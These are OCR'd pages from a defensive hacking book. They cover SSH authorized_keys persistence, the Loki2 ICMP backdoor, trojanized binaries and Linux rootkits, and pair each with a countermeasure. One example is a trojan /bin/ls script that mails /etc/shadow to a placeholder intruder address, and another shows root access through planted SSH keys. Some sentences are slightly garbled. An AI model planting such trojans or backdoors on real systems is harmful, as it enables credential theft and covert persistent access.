- pgno: 179
  md: '# SSH’s authorized_keys


    If the victim is running an SSH server, an intruder may maintain access to it
    by placing his public key in root’s .ssh directory. SSH will trust this public
    key and allow the intruder to log in provided that the intruder has the relevant
    private key.


    # Abuse SSH’s Authorized Keys Mechanism to Ensure Continued root Access


    The intruder may create the required public and private key pair by using the
    ssh-keygen program on his or her host:


    ```

    $ ssh-keygen -t rsa

    Generating rsa key pair.

    Enter file in to save the key (/home/intruder/):

    Created directory ''/home/intruder/.ssh''.

    Enter passphrase (empty for no passphrase): [enter]

    Enter same passphrase again: [enter]

    Your identification has been saved in /home/intruder/.ssh/id_rsa.

    Your public key has been saved in /home/intruder/.ssh/id_rsa.pub.

    The key fingerprint is:

    38:33:7b:db:05:00:10:62:57:bc:8b:85:05:9a:a9@intrudershost

    ```


    Now, the intruder must copy the contents of .ssh/id_rsa.pub to .ssh/authorized_keys
    on the victim host. Once this is done, the intruder may SSH into the victim host
    with no password:


    ```

    $ ssh root@victim’s_ip_address

    Last login: Sun Mar 30 02:23:48 2003 from intruder’s_host

    #

    ```


    # Do Not Allow root to log in via SSH


    Do not allow root to log in via SSH. To enforce this rule, edit sshd_config and
    make sure the following line is present:


    ```

    PermitRootLogin no

    ```


    # Loki2


    Loki2 is a freely available tool that is often used by intruders to install backdoors.
    It uses ICMP_ECHO and ICMP_REPLY packets to tunnel shell commands. This makes
    it extremely difficult to detect, since its packets may seem like ICMP traffic
    generated by the ping tool.


    ![](img/17cb132e62949dc7f5e0eadf90c71f51_179_0.png)'
  merge: -1
  img_proc: true
- pgno: 180
  md: '# 126 Part I: Hacking Techniques and Defenses


    More information about Loki can be obtained at http://www.phrack.com/show.php?p=51&a=6.


    # Tighten Firewall Rules


    Configure your firewall to drop incoming ICMP requests and out-traffic ICMP echo
    replies. Also, block all incoming and outgoing UDP traffic unless required.


    # TROJANS


    Hackers often place modified binaries of various commands on the victim hosts.
    Such modified binaries appear to run normally, but they repetitively perform malicious
    commands on behalf of the intruder.


    # Trojanize Common Commands


    An intruder may replace the /bin/ls binary with the following script:


    ```

    #!/bin/bash

    cat /etc/shadow | mail intruder@intruders_email

    /bin/ls.old

    ```


    This script emails not shadow the /etc/shadow file to the intruder. Of course,
    this is successful only when the root user executes it. Note that the script calls
    the original binary (saved as /ls.old). This makes it difficult for the victim
    to detect it. Such modified binaries are called Trojans.

    These are the binaries that are most Trojanized by intruders:


    arp, cat, chfn, chsh, crontab, du, ifconfig, finger, find, killall, more, locate,
    login, ls, lsof, passwd, pidof, ps, route, netstat, tail, tcpd, tcpdump, top,
    w, who, syslog.


    See "Common Commands" in the Reference Center of this book for descriptions of
    many of these commands.


    # Detect Trojans


    Please see "Detect Rootkits."


    # ROOTKITS


    Intruders do not have to go through much trouble in order to collect and install
    Trojans and backdoors. All they have to do is to search the web for rootkits.
    Rootkits are packages consisting of ready-made Trojans'
  merge: -1
  img_proc: true
- pgno: 181
  md: 'for the hacker''s convenience. They also contain other tools that enable an
    intruder to automatically clean log files, install backdoors, and employ tools
    such as network sniffers. The following hacks describe a few popular rootkits
    that are freely available online.


    # Adore


    The Adore rootkit is a collection of Linux Kernel Modules that enable an intruder
    to hide processes, files, and network device details. It also includes a root
    shell backdoor. Adore is available from http://www.team-teso.net/releases.php.


    # Linux Rootkit (LRK)


    The most popular Linux rootkit, the LRK contains Many Trojanized binaries of common
    commands including not limited to: chfn, chsh, crontab, du, find, ifconfig, inetd,
    killall, login, ls, netstat, password, pidof, ps, rshd, syslog, tcp, top, ssh,
    and su. It also includes a sniffer, as well as root shell backdoors. LRK is available
    from http://www.packetstormsecurity.org.


    # Tornkit


    Tornkit consists of various Trojan binaries, sniffing tools, and tools that perform
    automated disabling of syslogd and other critical services. It can be downloaded
    from http://www.packetstormsecurity.org.


    # Knark


    Knark is a rootkit that hides files and processes and also has the ability to
    redirect commands. It includes a backdoor to remotely execute commands. Knark
    is available from http://www.packetstormsecurity.org.


    # Detect Rootkits


    The following tools can be used to detect rootkits and Trojans:


    +   - Chrootkit can be used to check for rootkits on a system. It is available
    from http://www.chkrootkit.org/


    +   - Use Tripwire or Samhain to detect modified binaries. See http://www.tripwire.com/
    for more details about Tripwire. Information about Samhain can be obtained at
    http://samhain.sourceforge.net.'
  merge: -1
